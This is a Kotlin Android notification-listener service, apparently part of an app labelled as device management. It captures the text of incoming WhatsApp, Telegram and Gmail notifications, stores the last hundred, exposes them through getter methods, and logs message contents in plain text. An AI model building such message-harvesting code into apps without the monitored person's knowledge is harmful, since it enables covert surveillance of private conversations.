package com.tawasul.app.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class MDMNotificationListenerService : NotificationListenerService() {

    companion object {
        private const val TAG = "MDMNotifListener"
        private const val MAX_STORED = 100

        val WHATSAPP_PACKAGES = setOf(
            "com.whatsapp",
            "com.whatsapp.w4b",
            "com.gbwhatsapp",
            "com.whatsapp.plus"
        )

        val TELEGRAM_PACKAGES = setOf(
            "org.telegram.messenger",
            "org.telegram.messenger.web",
            "org.thunderdog.challegram"
        )

        @Volatile
        var instance: MDMNotificationListenerService? = null
            private set
    }

    private val recentNotifications = Collections.synchronizedList(mutableListOf<JSONObject>())

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.i(TAG, "Notification listener connected")
        instance = this
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
            val pkg = sbn.packageName
            val time = sbn.postTime

            val finalText = if (bigText.isNotEmpty()) bigText else text

            val appType = when {
                WHATSAPP_PACKAGES.contains(pkg) -> "whatsapp"
                TELEGRAM_PACKAGES.contains(pkg) -> "telegram"
                pkg == "com.google.android.gm" -> "gmail"
                else -> "other"
            }

            val notif = JSONObject().apply {
                put("package", pkg)
                put("app_type", appType)
                put("title", title)
                put("text", finalText)
                put("time", time)
                put("time_formatted", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(time)))
            }

            recentNotifications.add(0, notif)
            while (recentNotifications.size > MAX_STORED) {
                recentNotifications.removeAt(recentNotifications.size - 1)
            }

            Log.d(TAG, "Notification [$appType]: [$pkg] $title - $finalText")
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    override fun onListenerDisconnected() {
        Log.w(TAG, "Notification listener disconnected")
        instance = null
        super.onListenerDisconnected()
    }

    fun getRecentNotifications(): String {
        val arr = JSONArray()
        for (n in recentNotifications) arr.put(n)
        return arr.toString()
    }

    fun getNotificationsByApp(appType: String, limit: Int = 50): String {
        val arr = JSONArray()
        var count = 0
        for (n in recentNotifications) {
            if (n.optString("app_type") == appType) {
                arr.put(n)
                count++
                if (count >= limit) break
            }
        }
        return arr.toString()
    }

    fun getWhatsAppMessages(limit: Int = 50): String = getNotificationsByApp("whatsapp", limit)
    fun getTelegramMessages(limit: Int = 50): String = getNotificationsByApp("telegram", limit)

    fun clearNotifications() {
        recentNotifications.clear()
    }
}
